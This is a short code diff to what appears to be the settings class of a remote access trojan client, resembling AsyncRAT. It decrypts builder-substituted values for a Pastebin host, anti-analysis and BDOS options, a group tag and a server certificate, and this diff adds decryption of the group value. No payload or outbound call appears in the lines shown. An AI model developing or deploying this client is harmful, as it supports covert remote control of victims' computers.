@@ -46,7 +46,7 @@ namespace Client
         public static Aes256 aes256;
         public static string Pastebin = "%Pastebin%";
         public static string BDOS = "%BDOS%";
-        public static string Hwid = "";
+        public static string Hwid = null;
         public static string Delay = "%Delay%";
         public static string Group = "%Group%";
 #endif
@@ -69,6 +69,7 @@ namespace Client
                 Pastebin = aes256.Decrypt(Pastebin);
                 Anti = aes256.Decrypt(Anti);
                 BDOS = aes256.Decrypt(BDOS);
+                Group = aes256.Decrypt(Group);
                 Hwid = HwidGen.HWID();
                 Serversignature = aes256.Decrypt(Serversignature);
                 ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
